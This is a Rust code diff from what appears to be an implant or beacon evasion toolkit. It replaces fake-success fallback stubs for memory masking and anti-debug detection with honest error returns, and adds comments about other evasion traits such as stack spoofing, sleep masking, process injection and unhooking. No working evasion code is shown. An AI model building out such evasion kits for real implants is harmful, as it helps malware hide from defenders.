@@ -381,14 +381,24 @@ impl StackSpoofKit for Floors {
     }
 }
 impl SleepmaskKit for Floors {
+    // The trait signature returns `()`, so the floor cannot propagate an
+    // error. This is an HONEST no-op: it performs no mask and no sleep-window
+    // setup — unlike the `Result`-returning floors above/below, which were
+    // previously masking "unimplemented" as fake `Ok` success. Callers that
+    // need to detect "no sleep mask is wired" should do so via the presence
+    // of a real `SleepmaskKit` impl in `EvasionStack`, not by inspecting this
+    // call. See ROADMAP "implant-evasionsdk wiring".
     fn sleep_masked(&self, _s: u32, _gaps: &GapPool) {}
 }
 impl MemoryMaskKit for Floors {
     fn mask(&self) -> Result<MaskToken, EvasionError> {
         Err(EvasionError::NoFloor("MemoryMaskKit"))
     }
+    // Previously returned `Ok(())` — falsely claimed the image was decrypted.
+    // Now honestly reports that no MemoryMaskKit is wired. Callers MUST handle
+    // this (do NOT `?`-propagate into a beacon crash; log and degrade).
     fn unmask(&self, _t: MaskToken) -> Result<(), EvasionError> {
-        Ok(())
+        Err(EvasionError::NoFloor("MemoryMaskKit::unmask"))
     }
 }
 impl ProcessInjectKit for Floors {
@@ -407,8 +417,12 @@ impl UnhookKit for Floors {
     }
 }
 impl AntiDebugKit for Floors {
+    // Previously returned `Ok(false)` — falsely claimed "not being debugged",
+    // hiding the fact that no anti-debug check actually ran. Now honestly
+    // reports that no AntiDebugKit is wired. Callers MUST handle this (a real
+    // impl is the only source of trustworthy `Ok(bool)`).
     fn is_being_debugged(&self) -> Result<bool, EvasionError> {
-        Ok(false)
+        Err(EvasionError::NoFloor("AntiDebugKit"))
     }
 }
 
